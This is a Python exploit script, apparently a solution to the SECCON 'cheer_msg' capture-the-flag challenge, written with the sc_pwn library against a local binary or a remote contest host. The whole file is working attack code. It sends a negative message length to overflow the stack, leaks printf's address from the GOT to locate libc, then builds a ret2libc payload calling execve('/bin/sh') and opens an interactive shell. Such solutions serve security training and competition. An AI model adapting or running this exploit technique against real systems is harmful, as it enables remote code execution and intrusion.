#!/usr/bin/env python
from sc_pwn import *

str_pname   = './cheer_msg'

env = Environment('local', 'remote')
env.set_item('mode',    local   = 'LOCAL', \
                        remote  = 'SOCKET')
env.set_item('target',  local   = {'program':str_pname}, \
                        remote  = {'host':'cheermsg.pwn.seccon.jp','port':30527})
env.set_item('libc',    local   = lib_path(str_pname, 'libc.so.6'), \
                        remote  = '../libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368')
env.select()

libc = ELF(env.libc)
binf = ELF(str_pname)
addr_got_printf     = binf.got('printf')
addr_plt_printf     = binf.plt('printf')
addr_main           = binf.function('main')

#==========
def attack(cmn):
    cmn.read_until('Message Length >> ')
    cmn.sendln(str(-144))

    exploit_st1  = pack_32(addr_plt_printf)
    exploit_st1 += pack_32(addr_main)
    exploit_st1 += pack_32(addr_got_printf)
    cmn.read_until('Name >> ')
    cmn.sendln(exploit_st1)

    cmn.read_until('Message : \n')
    
    addr_libc_printf    = unpack_32(cmn.read(4))
    libc.set_location('printf', addr_libc_printf)
    addr_libc_execve    = libc.function('execve')
    addr_libc_str_sh    = libc.search('/bin/sh')
    
    cmn.read_until('Message Length >> ')
    cmn.sendln(str(-144))

    exploit_st2  = pack_32(addr_libc_execve)
    exploit_st2 += pack_32(0xdeadbeef)
    exploit_st2 += pack_32(addr_libc_str_sh)
    exploit_st2 += pack_32(NULL)
    exploit_st2 += pack_32(NULL)
    cmn.read_until('Name >> ')
    cmn.sendln(exploit_st2)

#==========

if __name__=='__main__':
    cmn = Communicate(env.target, env.mode)
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
